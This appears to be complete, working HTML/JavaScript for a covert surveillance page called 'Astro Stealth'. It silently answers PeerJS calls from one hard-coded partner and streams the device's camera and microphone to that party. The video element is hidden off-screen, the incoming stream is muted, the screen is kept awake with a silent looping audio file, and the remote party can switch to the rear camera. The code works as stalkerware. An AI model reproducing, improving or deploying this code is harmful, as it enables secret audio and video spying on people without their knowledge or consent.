<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Astro Stealth</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: transparent; overflow: hidden; }
        video {
            position: absolute; width: 1px; height: 1px;
            opacity: 0; pointer-events: none;
            top: -9999px; left: -9999px;
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>
    <video id="localVideo" autoplay muted playsinline></video>
    <script>
        const MY_ID = "BPrivate";
        const PARTNER_ID = "APrivate";

        let peer = null;
        let currentCall = null;
        let localStream = null;
        let dataConn = null;
        let currentCamera = "front";
        let wakeLock = null;
        let reconnectAttempts = 0;
        const MAX_RECONNECTS = 5;

        function log(msg) { console.log(`[STEALTH] ${msg}`); }

        // ── Get stream for a specific camera (camera arg is explicit, never reads global) ──
        async function getStreamForCamera(camera, isVideo) {
            // camera is passed in directly — never read from global currentCamera
            const facingMode = (camera === "back") ? "environment" : "user";
            log(`getStreamForCamera: camera=${camera} facingMode=${facingMode} isVideo=${isVideo}`);

            if (!isVideo) {
                return navigator.mediaDevices.getUserMedia({ audio: true, video: false });
            }

            // Try 1: exact facingMode
            try {
                const s = await navigator.mediaDevices.getUserMedia({
                    audio: true,
                    video: { facingMode: { exact: facingMode } }
                });
                const gotFacing = s.getVideoTracks()[0]?.getSettings()?.facingMode;
                log(`Try1 OK: got facingMode=${gotFacing}`);
                return s;
            } catch (e) {
                log(`Try1 failed (${e.name}): ${e.message}`);
            }

            // Try 2: enumerate devices, pick by label then by index
            try {
                // Need a temporary permission grant so labels are populated
                const tmp = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                tmp.getTracks().forEach(t => t.stop());

                const all = await navigator.mediaDevices.enumerateDevices();
                const cams = all.filter(d => d.kind === "videoinput");
                log(`Try2: found ${cams.length} cameras: ${cams.map((c,i)=>`[${i}]${c.label||'?'}`).join(', ')}`);

                let deviceId = null;

                // Label matching
                for (const c of cams) {
                    const lbl = c.label.toLowerCase();
                    if (camera === "back"  && (lbl.includes("back") || lbl.includes("rear") || lbl.includes("environment"))) {
                        deviceId = c.deviceId; log(`Try2 label match back: ${c.label}`); break;
                    }
                    if (camera === "front" && (lbl.includes("front") || lbl.includes("face") || lbl.includes("user") || lbl.includes("selfie"))) {
                        deviceId = c.deviceId; log(`Try2 label match front: ${c.label}`); break;
                    }
                }

                // Index fallback
                if (!deviceId && cams.length >= 2) {
                    deviceId = (camera === "back") ? cams[cams.length - 1].deviceId : cams[0].deviceId;
                    log(`Try2 index fallback: ${camera === "back" ? "last" : "first"}`);
                }

                if (deviceId) {
                    const s = await navigator.mediaDevices.getUserMedia({
                        audio: true,
                        video: { deviceId: { exact: deviceId } }
                    });
                    log(`Try2 OK via deviceId`);
                    return s;
                }
            } catch (e) {
                log(`Try2 failed: ${e.message}`);
            }

            // Try 3: ideal facingMode (may silently fall back to front — last resort)
            log(`Try3: ideal facingMode=${facingMode}`);
            return navigator.mediaDevices.getUserMedia({
                audio: true,
                video: { facingMode: { ideal: facingMode } }
            });
        }

        // ── Camera switch during a live call ──────────────────────────────────
        async function switchCamera(targetCamera) {
            log(`switchCamera called: ${currentCamera} → ${targetCamera}`);

            if (targetCamera === currentCamera) { log("Already on this camera"); return; }
            if (!currentCall) { currentCamera = targetCamera; log("No call; saved preference"); return; }
            if ((currentCall.metadata?.type || "voice") !== "video") {
                currentCamera = targetCamera; log("Audio-only; saved preference"); return;
            }

            try {
                // Step 1: get new stream (pass targetCamera explicitly)
                log(`Acquiring stream for targetCamera=${targetCamera}...`);
                const newStream = await getStreamForCamera(targetCamera, true);
                log(`New stream tracks: video=${newStream.getVideoTracks().length} audio=${newStream.getAudioTracks().length}`);

                // Step 2: get senders — poll until ICE is done (up to 4s)
                const pc = currentCall.peerConnection;
                if (!pc) { log("No peerConnection"); return; }

                let senders = [];
                for (let i = 0; i < 40; i++) {
                    senders = pc.getSenders().filter(s => s.track);
                    if (senders.length >= 2) break;
                    await new Promise(r => setTimeout(r, 100));
                }
                log(`Senders: ${senders.map(s => s.track.kind).join(", ")}`);

                // Step 3: replaceTrack
                const vSender = senders.find(s => s.track.kind === "video");
                const aSender = senders.find(s => s.track.kind === "audio");

                if (vSender) {
                    const newVTrack = newStream.getVideoTracks()[0];
                    await vSender.replaceTrack(newVTrack);
                    log(`✅ replaceTrack(video) done — ${targetCamera}`);
                } else {
                    log("⚠️ No video sender found");
                }
                if (aSender) {
                    const newATrack = newStream.getAudioTracks()[0];
                    if (newATrack) await aSender.replaceTrack(newATrack);
                }

                // Step 4: stop OLD stream only after replaceTrack succeeds
                if (localStream) {
                    localStream.getTracks().forEach(t => { t.stop(); log(`Stopped old ${t.kind} track`); });
                }

                localStream = newStream;
                currentCamera = targetCamera;  // ← only set AFTER everything succeeds
                document.getElementById("localVideo").srcObject = newStream;

                if (dataConn?.open) dataConn.send({ type: "camera_switched", camera: targetCamera });
                log(`✅ Camera switch complete → ${targetCamera}`);

            } catch (err) {
                log(`❌ switchCamera failed: ${err.name}: ${err.message}`);
            }
        }

        // ── Handle incoming call ──────────────────────────────────────────────
        async function handleIncomingCall(call) {
            const isVideo = (call.metadata?.type || "voice") === "video";
            log(`Incoming ${isVideo ? "VIDEO" : "AUDIO"} call`);
            try {
                currentCamera = "front";
                const stream = await getStreamForCamera("front", isVideo);
                localStream = stream;
                if (isVideo) document.getElementById("localVideo").srcObject = stream;

                call.answer(stream);
                currentCall = call;
                log(`Answered — ${isVideo ? "video+audio" : "audio"} from front cam`);

                call.on("stream", rs => rs?.getTracks().forEach(t => t.enabled = false));
                call.on("close", () => { log("Call closed"); endCall(); });
                call.on("error", e => { log(`Call error: ${e}`); endCall(); });
            } catch (err) {
                log(`Answer failed: ${err.message}`);
                call.close();
            }
        }

        function handleData(data) {
            log(`Data: type=${data.type}`);
            if (data.type === "switchCamera") {
                switchCamera(data.camera);
            } else if (data.type === "ping" && dataConn?.open) {
                dataConn.send({ type: "pong", timestamp: Date.now() });
            }
        }

        function endCall() {
            localStream?.getTracks().forEach(t => t.stop());
            localStream = null;
            currentCall?.close();
            currentCall = null;
            document.getElementById("localVideo").srcObject = null;
            log("Call ended");
        }

        async function preventSleep() {
            try { wakeLock = await navigator.wakeLock?.request("screen"); } catch (_) {}
            const a = new Audio();
            a.src = "data:audio/mp3;base64,SUQzBAAAAAABEVRYWFgAAAAtAAADY29tbWVudABCaWdTb3VuZEJhbmsuY29tIC8gTGFTb25vdGhlcXVlLm9yZwBURU5DAAAAHQAAA1N3aXRjaCBQbHVzIMKpIE5DSCBTb2Z0d2FyZQBUSVQyAAAABgAAAzIyMzUAVFNTRQAAAA8AAANMYXZmNTcuODMuMTAwAAAAAAAAAAAAAAD/80DEAAAAA0gAAAAATGFWZjU3LjgzLjEwMAAAAAAAAAAAAAAA//tQxAADBkIiGbgG4AbW0dYNwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
            a.loop = true; a.volume = 0; a.play().catch(() => {});
        }

        function initPeer() {
            peer?.destroy();
            peer = new Peer(MY_ID);
            peer.on("open", () => { log(`✅ Active as ${MY_ID}`); reconnectAttempts = 0; });
            peer.on("connection", c => {
                if (c.peer !== PARTNER_ID) { c.close(); return; }
                log("Data channel open");
                dataConn = c;
                c.on("data", handleData);
                c.on("close", () => { dataConn = null; });
            });
            peer.on("call", call => {
                if (call.peer === PARTNER_ID) handleIncomingCall(call);
                else call.close();
            });
            peer.on("disconnected", () => {
                if (reconnectAttempts++ < MAX_RECONNECTS) setTimeout(() => peer.reconnect(), 3000);
            });
            peer.on("error", err => {
                if (err.type === "unavailable-id") setTimeout(initPeer, 5000);
                else log(`Peer error: ${err.type}`);
            });
        }

        preventSleep();
        initPeer();

        window.addEventListener("beforeunload", () => {
            endCall(); peer?.destroy(); wakeLock?.release();
        });
    </script>
</body>
</html>
